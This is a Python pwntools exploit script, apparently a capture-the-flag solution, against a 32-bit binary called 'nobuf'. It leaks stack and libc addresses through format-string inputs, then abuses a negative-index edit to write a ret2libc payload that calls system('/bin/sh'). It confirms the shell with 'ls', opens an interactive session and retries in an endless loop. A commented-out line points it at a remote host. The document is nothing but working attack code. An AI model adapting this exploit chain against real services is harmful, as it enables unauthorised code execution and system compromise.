from pwn import *
def cmd(c):
	p.readuntil("input: ")
	p.sendline(c)
def edit(idx,title):

	cmd("2")
	p.readuntil("?\n")
	p.sendline("-"+str(idx))
	p.readuntil("title: ")
	#gdb.attach(p,'b *0x805b855')
	p.sendline(title)
	p.readuntil("price: ")
	p.sendline("0")
def exp():
	global p,aim
	p=process("./nobuf")
	#p=remote("10.99.99.16",29999)
	cmd("4|%24$p")
	p.readuntil("|")
	stack=int(p.readline(),16)
	log.warning(hex(stack))
	cmd("4|%pS%p")
	#context.log_level='debug'
	p.readuntil("S")
	base=int(p.readline(),16)-(0xf7d80f7c-0xf7d83000)
	log.info(hex(base))
	libc=ELF("/lib32/libc.so.6")
	libc.address=base
	aim_addr=stack-99
	log.warning(hex(libc.symbols['system']))
	off=(0x084978E4-aim_addr+0x100000000)>>8
	payload=p32(0x0806a000)*4+(p32(libc.symbols['system']+(0xf76feeb0-0xf752de70))+p32(0xdeadbeef)+p32(libc.search("/bin/sh").next()))
	cmd("2")
	p.readuntil("?\n")
	p.sendline("-"+str(off+1))
	#gdb.attach(p,'b* 0x805b2a0')
	p.readuntil("title: ")
	
	p.sendline(payload)
	p.sendline("ls")
	try :
		res=p.read()
		print res
		if "pri" not in res:
			p.interactive()
	except Exception as d:
		p.close()
	
while(1):
	exp()
